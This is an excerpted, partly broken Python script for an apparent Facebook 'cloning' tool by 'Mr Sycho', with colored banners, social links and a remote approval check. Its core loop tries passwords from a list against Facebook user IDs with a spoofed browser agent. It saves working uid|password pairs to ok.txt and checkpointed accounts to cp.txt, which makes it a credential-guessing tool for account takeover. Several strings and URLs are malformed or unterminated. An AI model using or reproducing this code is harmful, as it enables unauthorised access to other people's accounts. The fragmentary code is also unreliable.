...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Mr SYCHO Qureshi\x1b[0m\x1b[1;97m]
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Mr Sycho\x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version :1.0.1\x1b[0m\x1b[1;97m] \033[1;37m 

 ───────────────────────────────────────────────────────×

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : Mr-Sycho \x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : www.gitclone//github.com/Sychogujjar/Approval.git     -xd \x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : www.facebook./Sycho Gujjar-xd \x1b[0m\x1b[1;97m]
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/Sychogujjar/Approval.git"])

	exit(" [=>] FACEBOOK :  https://https://www.facebook.com/profile.php?id=100079935487041")
...
def notice():
	...
	runtxt("\n\033[0;97m  Free 2009 cloning Tool For Free Approval Join Group ")

	os.system("xdg-open https://https://www.facebook.com/profile.php?id=100079935487041
...
class Main:
	...
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://github.com/Sychogujjar/Approval.git').text
  ...
  /  |/  /___  / __/_ ______/ /  ___ 
 / /|_/ / __/ _\ \/ // / __/ _ \/ _ \
/_/  /_/_/   /___/\_, /\__/_//_/\___/ Mr Sycho
                 /___/               
 √Master Mind🥺❤️                                     
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : www.gitclone//github.com/Sychogujjar/Approval.git \x1b[0m\x1b[1;97m]
...
───────────────────────────────────────────────────────× 
    ...
    """)
		...
		subprocess.check_output(["am", "start", "https://www.facebook.com/profile.php?id=100079935487041
		print("───────────────────────────────────────────────────────× ")
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r  \033[0;97m   [=SYCHO=OK=>] %s | %s\033[0;97m         "%(uid, pw))

				self.ok.append("%s|%s"%(uid, pw))

				open("ok.txt","a").write("   [=SYCHO=OK=>]  %s|%s\n"%(uid, pw))

				break

			elif "www.facebook.com" in response.json()["error_msg"]:

				print("\r  \033[0;92m   [=SYCHO=CP=>] %s | %s\033[0;97m         "%(uid, pw))

				self.cp.append("%s|%s"%(uid, pw))

				open("cp.txt","a").write("   [=SYCHO=CP=>]  %s|%s\n"%(uid, pw))
...
if len(sys.argv) == 2:
	...
	if sys.argv[1] == "--info":
		...
		print(" [*] Team      :Sycho Gujjar  \n")

		print(" [ Sosial Medi  ] \n")

		print(" [*] Facebook  : https://facebook.com/ ")

		exit(" [*] GitHub    :https://github.com/Sychogujjar/Approve.git / ")
